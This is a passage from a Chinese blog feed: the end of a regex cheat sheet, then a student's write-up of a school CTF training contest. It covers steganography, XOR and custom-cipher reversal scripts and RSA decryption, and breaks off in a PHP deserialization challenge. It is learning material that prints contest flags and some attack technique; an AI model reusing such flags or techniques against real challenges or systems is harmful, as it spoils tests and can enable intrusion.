align="center">十六进制值</td><td>/^#?([a-f0-9]{6}|[a-f0-9]{3})$/</td></tr><tr><td align="center">电子邮箱</td><td>/^([a-z0-9_.-]+)@([\da-z.-]+).([a-z.]{2,6})$/ /^[a-z\d]+(.[a-z\d]+)*@(<a href="-%5B%5Cda-z%5D">\da-z</a>?)+(.{1,2}[a-z]+)+$/</td></tr><tr><td align="center">URL</td><td>/^(https?://)?([\da-z.-]+).([a-z.]{2,6})([/\w .-]*)*/?$/</td></tr><tr><td align="center">IP 地址</td><td>/((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)/ /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/</td></tr><tr><td align="center">HTML 标签</td><td>/^&lt;([a-z]+)([^&lt;]+)*(?:&gt;(.*)&lt;/\1&gt;|\s+/&gt;)$/</td></tr><tr><td align="center">删除代码\注释</td><td>(?&lt;!http:|\S)//.*$</td></tr><tr><td align="center">Unicode编码中的汉字范围</td><td>/^[\u2E80-\u9FFF]+$/</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学校ctf训练赛的wp</title>
      <link href="2021/01/29/%E5%AD%A6%E6%A0%A1ctf%E8%AE%AD%E7%BB%83%E8%B5%9B%E7%9A%84wp/"/>
      <url>2021/01/29/%E5%AD%A6%E6%A0%A1ctf%E8%AE%AD%E7%BB%83%E8%B5%9B%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一次为期十天的训练赛，检验了前段时间所学，也认识了很多不足~~~有2题好像好简单但没啥头绪，到后面心态也没前几天那么好了，有、、浮躁，基本都没怎么做题，还要努力呀</p><p><img src="https://i.loli.net/2021/02/13/FKsAV1k6ML2vE9q.png"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>linux下命令行<code>strings 文件名</code> 即得flag</p><h2 id="图片中的密码"><a href="#图片中的密码" class="headerlink" title="图片中的密码"></a>图片中的密码</h2><p>隐写，binwalk得加密的压缩包，密码在注释中，解压 即得flag</p><h2 id="Lsb"><a href="#Lsb" class="headerlink" title="Lsb"></a>Lsb</h2><p>Lsb低位隐写，stegsolve看一下图片的低位通道</p><p>确定为红绿蓝0通道；data extract得到504b开头的一堆东西，猜测为压缩包</p><p>另存为、解压即得flag</p><h2 id="Fakenews"><a href="#Fakenews" class="headerlink" title="Fakenews"></a>Fakenews</h2><p>1.伪加密，修改即可，得到docx文件</p><p>2.binwalk将docx文件分离</p><p><img src="https://i.loli.net/2021/02/13/Z2suSinPt6zgRew.png"></p><p>打开文件document即得flag(为了避免直接搜索flag还去掉了f~~~)</p><p><img src="https://i.loli.net/2021/02/13/LHkGMKzg74lphd1.png"></p><h2 id="Hackmeok"><a href="#Hackmeok" class="headerlink" title="Hackmeok"></a>Hackmeok</h2><p><img src="https://i.loli.net/2021/02/13/1NmJpRkdxIGrZq3.png"></p><p>下载得一个虚拟盘，打开有一txt文件内容如上，提示删掉了视频，flag是中文和标点符号</p><p>winhex修复视频文件</p><p><img src="https://i.loli.net/2021/02/13/I4xDeUzijdMJbQ5.png"></p><p>得到这个视频</p><p><img src="https://i.loli.net/2021/02/13/OunDKr87C9JMSgI.png"></p><p>截图一下</p><p><img src="https://i.loli.net/2021/02/13/y9ngPbqIzXD7Wij.png"></p><p>-..—-.–…../–..–…-.—-/-..—-.–.-…-/-..—…..–.-/-..—.-….–./–…-….-…-/—.–.-….-../——–….–../-.-.-..–..-…/-.-.-..–..-…/-.-.-..–..-…/-.-.-..–..-…/-.-.-..–..-…/——–…….-</p><p>找个中文摩斯网站解密一下得到flag：</p><p><img src="https://i.loli.net/2021/02/13/XAtjHUGdYN7zopL.png"></p><h2 id="生命是有光的"><a href="#生命是有光的" class="headerlink" title="生命是有光的"></a>生命是有光的</h2><p>得到压缩包，提示解压密码为6位小写字母</p><p>爆破太久，看一下文件名，结合题目名猜测为：iloveu</p><p><img src="https://i.loli.net/2021/02/13/qOvTngsQhXUaKcP.png"></p><p>解压即得图片</p><p><img src="https://i.loli.net/2021/02/13/yTcmSpA9hwOMRfF.png"></p><p>binwalk分析不出隐藏文件，hxd看一下发现是存在zip压缩包的，但出题人将504b后的两个十六进制数调换了位置，我们换回来就可以了</p><p><img src="https://i.loli.net/2021/02/13/lV5cLeqXJpzja1S.png"></p><p>得到的压缩包中其实有两个文件，但另一个password.txt只有504b0102开头的串，也就是说在压缩包中是看不到他的名字的</p><p>当时我打算foremost看能不能爆一下内容，不行再手动改压缩包</p><p>foremost结果：</p><p><img src="https://i.loli.net/2021/02/13/sXikLbvPOMT7qut.png"></p><p>显然password.txt没用，只是提示咱们这个压缩包是伪加密，0900改成0000即得flag文件！</p><p><img src="https://i.loli.net/2021/02/13/RdSFf2MpgYL1keH.png"></p><p>这个格式是MP3，改一下后缀名即可</p><p><img src="https://i.loli.net/2021/02/13/pRYwnotKLPsCE46.png"></p><p>得到了一个夹杂着英语听力和嗨歌的mp3文件，使劲听qaq，不过最后还是求助了学长才得flag，听的人麻了，还把高中班长拉来一起折磨~~~</p><p>提示flag为六个单词：flag{it’s_really_fun_to_compress_data}</p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Easyreverse"><a href="#Easyreverse" class="headerlink" title="Easyreverse"></a>Easyreverse</h2><p>如图~~</p><p><img src="https://i.loli.net/2021/02/13/3w4yvu9OejHfnT8.png"></p><h2 id="Easyc"><a href="#Easyc" class="headerlink" title="Easyc"></a>Easyc</h2><p>提供了一个exe文件和pass</p><blockquote><p>Pass：也就是flag加密后的结果103107097096122048104048113086048116095109053116116094066086119052114126094116049108114056050088067088109102110056119104056098095119115055103115099100124</p></blockquote><p>程序是用c写的，IDAf5看一下伪代码</p><p>主函数：<br><img src="https://i.loli.net/2021/02/13/sn4WbovqXadOhJZ.png"></p><p>加密函数：<br><img src="https://i.loli.net/2021/02/13/BHk8aTb7c5Kwmrv.png"></p><p>分析可知：<br>1.输入学长的学号：1707170129，才能进行下一步的加密操作<br>2.输入要加密的字符串，程序就会输出加密后的字符串<br>所以我们的目的是利用给出的加密字段和加密函数，求得加密前的flag</p><blockquote><p>对程序和pass分析可知：<br>1.三位数字代表一个字符，则flag{xxxx}(包含flag{}共51个字符)<br>2.a1=v6也就是flag;a2=str1也就是学号1707170129<br>3.加密函数中：<br>v7=flag，str=学号1707170129，v6=10(学号的长度)</p><p>For循环(i–flag长度)：<br>    v5=学号[i%10] - 48；</p><p>Sprintf：将格式化的字符串写入v4最后输出，将原本一个字符转换为3个数字输入的v4中。<br>格式化方法：v5^v7[i]；由此可知还原方法:每三位数与V5亦或<br>求各个字符的v5</p></blockquote><p><img src="https://i.loli.net/2021/02/13/3Ok9wPoH8JnIfru.png"></p><p>即得v5</p><p><img src="https://i.loli.net/2021/02/13/Zo74yGxDfgXlcjm.png"></p><p>再写个小脚本跑跑即得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">103</span>,<span class="number">107</span>,<span class="number">97</span>,<span class="number">96</span>,<span class="number">122</span>,<span class="number">48</span>,<span class="number">104</span>,<span class="number">48</span>,<span class="number">113</span>,<span class="number">86</span>,<span class="number">48</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">109</span>,<span class="number">53</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">94</span>,<span class="number">66</span>,<span class="number">86</span>,<span class="number">119</span>,<span class="number">52</span>,<span class="number">114</span>,<span class="number">126</span>,<span class="number">94</span>,<span class="number">116</span>,<span class="number">49</span>,<span class="number">108</span>,<span class="number">114</span>,<span class="number">56</span>,<span class="number">50</span>,<span class="number">88</span>,<span class="number">67</span>,<span class="number">88</span>,<span class="number">109</span>,<span class="number">102</span>,<span class="number">110</span>,<span class="number">56</span>,<span class="number">119</span>,<span class="number">104</span>,<span class="number">56</span>,<span class="number">98</span>,<span class="number">95</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">55</span>,<span class="number">103</span>,<span class="number">115</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">124</span>]</span><br><span class="line">b = [<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">1</span>]</span><br><span class="line">l = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">x = <span class="built_in">chr</span>(i^b[l])</span><br><span class="line">l+=<span class="number">1</span> </span><br><span class="line">print(x,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/kluHVp6Yt4Fzied.png"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Case64？"><a href="#Case64？" class="headerlink" title="Case64？"></a>Case64？</h2><p>给出Case64的加密py源码(我在后面加了注释)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">C64_TABLE = [</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;?&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">s: <span class="built_in">str</span></span>):</span></span><br><span class="line">    bits = <span class="string">&quot;&quot;</span>.join(<span class="built_in">bin</span>(byte)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> <span class="built_in">bytes</span>(s.encode(<span class="string">&#x27;utf8&#x27;</span>)))[::-<span class="number">1</span>]<span class="comment">#逆序输出s的二进制形式</span></span><br><span class="line">    length = <span class="built_in">len</span>(bits)<span class="comment">#求输入的长度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(length - <span class="number">1</span>):<span class="comment">#n个字符执行8*n次</span></span><br><span class="line">        bits = bits[:count] + <span class="built_in">str</span>(<span class="built_in">int</span>(bits[count]) ^ <span class="built_in">int</span>(bits[count+<span class="number">1</span>])) + bits[count + <span class="number">1</span>:]<span class="comment">#将每个二进制与其后的一个字符异或再拼接</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">            bits = (bits[-<span class="number">1</span>]+bits[:-<span class="number">1</span>])[::-<span class="number">1</span>]<span class="comment">#将最末端的bit提到最前端，再逆序</span></span><br><span class="line">            </span><br><span class="line">    left = <span class="string">&quot;&quot;</span></span><br><span class="line">    right = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):<span class="comment">#偶数位包括0 进入left 奇数位进入right</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> i % <span class="number">2</span>):</span><br><span class="line">            left += bits[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right += bits[i]</span><br><span class="line"></span><br><span class="line">    data = right[:<span class="built_in">len</span>(right)//<span class="number">2</span>] + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(<span class="built_in">int</span>(byte1) ^ <span class="built_in">int</span>(byte2)) <span class="keyword">for</span> byte1, byte2 <span class="keyword">in</span> <span class="built_in">zip</span>(left, right)) + right[<span class="built_in">len</span>(right)//<span class="number">2</span>:]</span><br><span class="line">    <span class="comment">#//向前取整，data=right左半+left与right异或+right右半</span></span><br><span class="line"></span><br><span class="line">    data = data + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(byte % <span class="number">2</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>-<span class="built_in">len</span>(data) % <span class="number">6</span>))</span><br><span class="line">    <span class="comment">#data = data + byte%2(即取二进制)(byte=range(6-data长度%6))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(C64_TABLE[<span class="built_in">int</span>(data[i*<span class="number">6</span>:(i+<span class="number">1</span>)*<span class="number">6</span>], <span class="number">2</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)//<span class="number">6</span>))</span><br><span class="line">    <span class="comment">#将data以6位二进制为一组，转为十进制即为在C64中的下标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag=<span class="string">&quot;flag&#123;???&#125;&quot;</span></span><br><span class="line">    print(encrypt(flag))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># result -&gt; _b1QZYJ5GGEjL?ghMbY6GzV3mCuPABc7t_m3S_tTm532vQleV</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#111110011011110101010000011001011000001001111001000110000110000100100011001011111111100000100001001100011011011000111010000110110011010101110111100110000010101110001111000000000001011100111011101101111110100110110111010010111110101101010011100110111001110111110110101111010000100101011110</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由此即可知解密方法：</p><p><strong>1.将data以6位二进制为一组，转为十进制即为在C64中的下标</strong><br>转为数组下标<br>62,27,53,16,25,24,9,57,6,6,4,35,11,63,32,33,12,27,24,58,6,51,21,55,38,2,46,15,0,1,28,59,45,62,38,55,18,62,45,19,38,57,55,54,47,16,37,30,21</p><p>再转为二进制<br>111110011011110101010000011001011000001001111001000110000110000100100011001011111111100000100001001100011011011000111010000110110011010101110111100110000010101110001111000000000001011100111011101101111110100110110111010010111110101101010011100110111001110111110110101111010000100101011110<br>010101</p><p><strong>2.range(6-原长度%6)</strong><br>减去多出的长度：6-data长度%6<br>设原长度为x;则现长度 294=x+(6-x%6)</p><p>6-x%6=6/5/4/3/2/1</p><p>294=x+6/5/4/3/2/1</p><p>x=288/289/290/291/292/293<br>x=288√、289X、290√、291x、292√、293x</p><p>故x=288/290/292(这里从288开始试，直接能得到flag)</p><p>right=<br>left=bin(int(‘’,2)^int(‘’,2))</p><p>288=&gt;144=&gt;72<br>111110011011110101010000011001011000001001111001000110000110000100100011<br>001011111111100000100001001100011011011000111010000110110011010101110111100110000010101110001111000000000001011100111011101101111110100110110111<br>010010111110101101010011100110111001110111110110101111010000100101011110</p><p>right=111110011011110101010000011001011000001001111001000110000110000100100011010010111110101101010011100110111001110111110110101111010000100101011110<br>left =bin(int(‘111110011011110101010000011001011000001001111001000110000110000100100011010010111110101101010011100110111001110111110110101111010000100101011110’,2)^int(‘001011111111100000100001001100011011011000111010000110110011010101110111100110000010101110001111000000000001011100111011101101111110100110110111’,2))<br>     =110101100100010101110001010101000011010001000011000000110101010001010100110100111100000011011100100110111000101011001101000010101110000011101001</p><p><strong>3.向前取整，data=right左半+left与right异或+right右半 =&gt;求得left</strong><br>288<br>right=111110011011110101010000011001011000001001111001000110000110000100100011010010111110101101010011100110111001110111110110101111010000100101011110<br>left =110101100100010101110001010101000011010001000011000000110101010001010100110100111100000011011100100110111000101011001101000010101110000011101001</p><p><strong>4.偶数位包括0 进入left 奇数位进入right</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bits=<span class="string">&quot;&quot;</span></span><br><span class="line">left  = <span class="string">&quot;&quot;</span></span><br><span class="line">right = <span class="string">&quot;&quot;</span></span><br><span class="line">l=<span class="number">0</span></span><br><span class="line">r=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(left)+<span class="built_in">len</span>(right)):  <span class="comment"># 偶数位包括0 进入left 奇数位进入right</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> i % <span class="number">2</span>):</span><br><span class="line">        bits += left[l]</span><br><span class="line">        l+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bits += right[r]</span><br><span class="line">        r+=<span class="number">1</span></span><br><span class="line">print(bits)</span><br></pre></td></tr></table></figure><p>288<br>111101110110100101100101011100110011101100000010001101100011000101001010001001000011010101001011000000010100101000110110001000010010011000100101101100100100111111110100010001011011001110100101110000111100111111000001110110011111010110110110010001011101100110101000010000011011100111010110</p><p><strong>5.原：将最末端的bit提到最前端，再逆序，(bits[-1] + bits[:-1])[::-1]</strong> </p><p><strong>现：先逆序，再将最前端放到最后端</strong><br><strong>逆序：bits = bits[::-1]</strong><br><strong>将最前端放到最后端：bits = bits[2:len(bits)] + bits[0]</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    bits = bits[::-<span class="number">1</span>]</span><br><span class="line">    bits = bits[<span class="number">1</span>:<span class="built_in">len</span>(bits)] + bits[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>6.<br><strong>原：由前面开始，将每个二进制与其后的一个字符异或再拼接</strong></p><p><strong>现：由后面开始，将每个二进制与其后一个字符异或再拼接</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bits)-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    bits = bits[:count-<span class="number">1</span>] + <span class="built_in">str</span>(<span class="built_in">int</span>(bits[count-<span class="number">1</span>]) ^ <span class="built_in">int</span>(bits[count])) + bits[count:]</span><br></pre></td></tr></table></figure><p>综合5、6即得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bits)-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        bits = bits[::-<span class="number">1</span>]</span><br><span class="line">        bits = bits[<span class="number">1</span>:<span class="built_in">len</span>(bits)] + bits[<span class="number">0</span>]</span><br><span class="line">    bits = bits[:count-<span class="number">1</span>] + <span class="built_in">str</span>(<span class="built_in">int</span>(bits[count-<span class="number">1</span>]) ^ <span class="built_in">int</span>(bits[count])) + bits[count:]</span><br><span class="line">print(bits[::-<span class="number">1</span>], <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>最终：<br>011001100110110001100001011001110111101101000011001101100011010001011111001100010011010101011111010000000101111100110110001100000111001000110001011011100011100101011111001100110110111001100011011100100111100101110000011101000101111101101101001100110111010001101000001100000110010001111101 </p><p>转换ascii得flag{C64_15_@_60r1n9_3ncrypt_m3th0d}</p><h2 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h2><p>0x进制)</p><p>%4D%54%41%79%49%44%45%77%4F%43%41%35%4E%79%41%78%4D%44%4D%67%4D%54%49%7A%49%44%45%77%4E%69%41%78%4D%54%63%67%4D%54%45%31%49%44%45%78%4E%69%41%78%4D%44%41%67%4D%54%41%78%49%44%6B%35%49%44%45%78%4D%53%41%78%4D%44%41%67%4D%54%41%78%49%44%45%79%4E%51%3D%3D（url）</p><p>MTAyIDEwOCA5NyAxMDMgMTIzIDEwNiAxMTcgMTE1IDExNiAxMDAgMTAxIDk5IDExMSAxMDAgMTAxIDEyNQ==（base64）</p><p>102 108 97 103 123 106 117 115 116 100 101 99 111 100 101 125（ascii）</p><p>flag{justdecode}</p><h2 id="Ilovebacon"><a href="#Ilovebacon" class="headerlink" title="Ilovebacon"></a>Ilovebacon</h2><p>– — .-. … . ..–.- .. … ..–.- -.-. — — .-.. ..–.- -… ..- - ..–.- -… .- -.-. — -. ..–.- .. … ..–.- -.-. — — .-.. . .-. ..–.- .- .- -… .- -… .- .- .- .- .- .- .- -… -… -… -… .- -… .- -… .- .- .- .- .- .- -… -… -… .- .- .- .- -… -… .- .- .- .- .- .- -… .- -… -… .- .- -… -… .- .- .- .- .- .- .- .- -… .- .- .- .- -… -… .- .- -… -… -… .- .- .- .- -… -… -… -… .- .- .-（摩斯）</p><p>morse_is_cool_but_bacon_is_cooler_aababaaaaaaabbbbababaaaaaabbbaaaabbaaaaaababbaabbaaaaaaaabaaaabbaabbbaaaabbbbaaa</p><p>Aababaaaaaaabbbbababaaaaaabbbaaaabbaaaaaababbaabbaaaaaaaabaaaabbaabbbaaaabbbbaaa   =》   fahvaodalgaegody（培根） =》 flaghaveagoodday（栅栏）<br>flag{haveagoodday}</p><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p><img src="https://i.loli.net/2021/02/13/LeFhwRXJECos1nd.png"></p><p>得到n<br>解出p、q<br>利用脚本：（f=x，x取值为三段密文的十进制）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">325045504186436346209877301320131277983</span></span><br><span class="line">q = <span class="number">302825536744096741518546212761194311477</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = x</span><br><span class="line">n = p * q</span><br><span class="line">fn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, fn)</span><br><span class="line">h = <span class="built_in">hex</span>(gmpy2.powmod(f, d, n))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(h) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">  h = <span class="string">&#x27;0&#x27;</span> + h</span><br><span class="line"><span class="built_in">print</span> (d)</span><br><span class="line"><span class="built_in">print</span> (h)</span><br></pre></td></tr></table></figure><p>(m1)5077560311513279671817430508125151837396585328082180175253360345086848717946<br>(m2)70099856477856647119324475779448956753505959373194081911451122574748717928011<br>(m3)6793000449683458761243147198477390385097096925500467689087326832717298959098</p><p>最后拼接解出的可打印字符即得flag{3b6d3806-4b2b-11e7-95a0-000c29d7e93d}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="PHP1"><a href="#PHP1" class="headerlink" title="PHP1"></a>PHP1</h2><p><img src="https://i.loli.net/2021/02/13/YH3cmquvOX7CiZk.png"></p><p>重置了__wakeup()函数                            #反序列化时触发，传入参数应为序列化<br>$this-&gt;password = $nobodyknow;           #password始终等于nobodyknow，password值无意义<br>Private                                                     #private属性序列化的时候格式是%00类名%00成员名;<br>                                                                #protected属性序列化的时候格式是 %00*%00成员名<br>===    Hint：引用&amp;                                  #这两个对象变量一定要指向某个类的同一个实例（即同一个对象）</p><p>在php中，引用$a=&amp;$b;实际是同一个内容有a和b两个别名；而不是像c语言一样的指针</p><p>也就是说利用引用&amp;将nobodyknow的值传递给varify<br>类属性赋值：php中类的属性声明时赋值一定是一个直接的值，不能是函数返回值，表达式，以及通过”.”连接起来的字符串，如果偏要用这些赋值，可以通过构造函数__construct();    ——也就是说如varify=&amp;$password或者&amp;$nobodyknow的语法是错误的</p><p>如果在 foreach 